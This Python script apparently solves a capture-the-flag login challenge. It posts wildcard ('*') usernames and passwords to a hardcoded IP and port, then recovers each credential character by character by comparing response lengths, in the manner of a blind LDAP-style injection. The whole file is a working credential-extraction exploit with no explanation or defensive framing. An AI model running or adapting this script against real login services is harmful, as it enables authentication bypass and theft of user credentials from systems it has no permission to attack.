#!/usr/bin/env python3

import string
import requests
import re

url = 'http://139.59.178.146:31348/login'

# data = {
#     'username': f'*',
#     'password': f'*'
# }
# resp = requests.post(url, data=data).text
# print(resp)
# print(len(resp))

def search(process, pass_char='*', password=False):
    check = 2586

    letters = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', "'", '(', ')', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`', '{', '|', '}', '~', ' ']
    letters_len = len(letters)

    word_find = ''
    last_letter_position = 0
    while last_letter_position <= letters_len:
        for i in range(letters_len):
            word_new = word_find + letters[i] + '*'
            if password:
                data = {
                    'username': f'{pass_char}',
                    'password': f'{word_new}'
                }
            else:
                data = {
                    'username': f'{word_new}',
                    'password': f'{pass_char}'
                }
            
            resp = requests.post(url, data=data).text
            # title = re.search('<title>(.*)</title>', resp).group(1)
            # title = resp[171:180]

            if len(resp) == check:
                word_find += letters[i]
                print(f'{process} - new letter found: {word_find}')
                break
            last_letter_position = i

    print(f'word found: {word_find}')

from multiprocessing import Pool
pool = Pool()

print('searching username...')
result1 = pool.apply_async(search, ['user'])    # evaluate "solve1(A)" asynchronously

print('searching password...')
result2 = pool.apply_async(search, ['password', '*', True])    # evaluate "solve2(B)" asynchronously

pool.close()
pool.join()